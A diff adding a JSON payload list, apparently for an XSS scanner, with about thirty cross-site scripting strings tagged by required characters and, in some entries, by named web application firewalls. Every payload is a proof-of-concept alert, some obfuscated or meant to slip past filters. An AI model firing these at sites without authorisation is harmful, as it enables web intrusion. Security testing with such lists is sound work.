@@ -1,0 +1,188 @@
+[
+  {
+    "Payload": "<script>alert('XSS')</script>",
+    "Attribute": ["<", ">", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "\"><script>alert('XSS')</script>",
+    "Attribute": ["\"", ">", "<", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "'><script>alert('XSS')</script>",
+    "Attribute": ["'", ">", "<", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "<img src=x onerror=alert('XSS')>",
+    "Attribute": ["<", ">", "=", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "<svg onload=alert('XSS')>",
+    "Attribute": ["<", ">", "=", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "javascript:alert('XSS')",
+    "Attribute": [":", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "\"><img src=x onerror=alert('XSS')>",
+    "Attribute": ["\"", ">", "<", "=", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "'><img src=x onerror=alert('XSS')>",
+    "Attribute": ["'", ">", "<", "=", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "<iframe src=javascript:alert('XSS')>",
+    "Attribute": ["<", ">", "=", ":", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "<body onload=alert('XSS')>",
+    "Attribute": ["<", ">", "=", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "<div onmouseover=alert('XSS')>",
+    "Attribute": ["<", ">", "=", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "\"><svg onload=alert('XSS')>",
+    "Attribute": ["\"", ">", "<", "=", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "'><svg onload=alert('XSS')>",
+    "Attribute": ["'", ">", "<", "=", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "<script>confirm('XSS')</script>",
+    "Attribute": ["<", ">", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "<script>prompt('XSS')</script>",
+    "Attribute": ["<", ">", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "%3Cscript%3Ealert('XSS')%3C/script%3E",
+    "Attribute": ["%", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "<ScRiPt>alert('XSS')</ScRiPt>",
+    "Attribute": ["<", ">", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "Attribute": ["<", ">", "(", ")", "."],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "<img src=\"x\" onerror=\"alert('XSS')\">",
+    "Attribute": ["<", ">", "\"", "=", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "<input onfocus=alert('XSS') autofocus>",
+    "Attribute": ["<", ">", "=", "(", ")", "'"],
+    "waf": null,
+    "count": 0
+  },
+  {
+    "Payload": "\"><iframe src=javascript:alert('XSS')>",
+    "Attribute": ["\"", ">", "<", "=", ":", "(", ")", "'"],
+    "waf": "cloudflare",
+    "count": 0
+  },
+  {
+    "Payload": "<svg/onload=alert('XSS')>",
+    "Attribute": ["<", ">", "/", "=", "(", ")", "'"],
+    "waf": "cloudflare",
+    "count": 0
+  },
+  {
+    "Payload": "<img/src=x/onerror=alert('XSS')>",
+    "Attribute": ["<", ">", "/", "=", "(", ")", "'"],
+    "waf": "cloudflare",
+    "count": 0
+  },
+  {
+    "Payload": "<details open ontoggle=alert('XSS')>",
+    "Attribute": ["<", ">", "=", "(", ")", "'"],
+    "waf": "akamai",
+    "count": 0
+  },
+  {
+    "Payload": "<marquee onstart=alert('XSS')>",
+    "Attribute": ["<", ">", "=", "(", ")", "'"],
+    "waf": "akamai",
+    "count": 0
+  },
+  {
+    "Payload": "\"><details open ontoggle=alert('XSS')>",
+    "Attribute": ["\"", ">", "<", "=", "(", ")", "'"],
+    "waf": "incapsula",
+    "count": 0
+  },
+  {
+    "Payload": "<textarea onfocus=alert('XSS') autofocus>",
+    "Attribute": ["<", ">", "=", "(", ")", "'"],
+    "waf": "incapsula",
+    "count": 0
+  },
+  {
+    "Payload": "<select onfocus=alert('XSS') autofocus>",
+    "Attribute": ["<", ">", "=", "(", ")", "'"],
+    "waf": "sucuri",
+    "count": 0
+  },
+  {
+    "Payload": "<keygen onfocus=alert('XSS') autofocus>",
+    "Attribute": ["<", ">", "=", "(", ")", "'"],
+    "waf": "barracuda",
+    "count": 0
+  },
+  {
+    "Payload": "<video><source onerror=alert('XSS')>",
+    "Attribute": ["<", ">", "=", "(", ")", "'"],
+    "waf": "f5",
+    "count": 0
+  },
+  {
+    "Payload": "<audio src=x onerror=alert('XSS')>",
+    "Attribute": ["<", ">", "=", "(", ")", "'"],
+    "waf": "aws",
+    "count": 0
+  }
+]
